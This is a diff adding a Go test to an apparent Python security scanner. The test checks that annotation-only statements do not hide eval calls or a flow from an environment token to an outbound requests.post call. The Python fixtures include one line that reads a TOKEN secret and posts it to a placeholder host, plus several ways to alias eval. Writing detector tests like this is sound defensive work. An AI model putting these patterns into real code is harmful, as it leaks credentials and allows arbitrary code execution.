@@ -44,3 +44,31 @@ func TestNativeDefinitionExpressionsReachPythonChecks(t *testing.T) {
 		})
 	}
 }
+
+func TestNativeAnnotationOnlyStatementsDoNotErasePythonFlows(t *testing.T) {
+	cfg := scantest.DefaultConfig()
+	cfg.Scanner.Checks.Python = true
+	s, err := scantest.New(cfg, t)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct{ name, text, rule string }{
+		{name: "callable", text: "run = eval\nrun: object\nrun(value)\n", rule: "PY-AST2"},
+		{name: "environment", text: "import os, requests\ntoken = os.getenv('TOKEN')\ntoken: str\nrequests.post('https://example.invalid', data=token)\n", rule: "PY-TT3"},
+		{name: "instance", text: "class Holder:\n    pass\nholder = Holder()\nholder.run = eval\nholder.run: object\nholder.run(value)\n", rule: "PY-AST2"},
+		{name: "mapping", text: "actions = {'run': eval}\nactions['run']: object\nactions['run'](value)\n", rule: "PY-AST2"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			r, err := s.ScanBytes(t.Context(), "annotation.py", []byte(tc.text))
+			if err != nil && !errors.Is(err, scantest.ErrIncomplete) {
+				t.Fatal(err)
+			}
+			for _, finding := range r.Findings {
+				if finding.RuleID == tc.rule {
+					return
+				}
+			}
+			t.Fatalf("annotation-only statement hid %s: %+v", tc.rule, r.Findings)
+		})
+	}
+}
